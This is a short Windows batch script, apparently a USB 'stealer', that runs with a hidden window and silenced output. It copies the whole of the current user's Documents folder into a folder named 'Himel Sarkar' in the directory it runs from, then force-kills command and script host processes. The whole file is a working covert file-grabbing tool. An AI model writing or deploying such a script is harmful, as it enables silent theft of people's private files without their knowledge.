@echo off > NUL
powershell.exe -WindowStyle hidden -command ""
TITLE Copy Folder with Contents
set SOURCE=%USERPROFILE%\Documents
set DESTINATION=%cd%
mkdir "Himel Sarkar"
xcopy %SOURCE%\*.* %DESTINATION%\"Himel Sarkar"\ /s /e /i /Y >NUL
TASKKILL /F /IM cmd.exe /T
TASKKILL /F /IM wscript.exe /T
exit




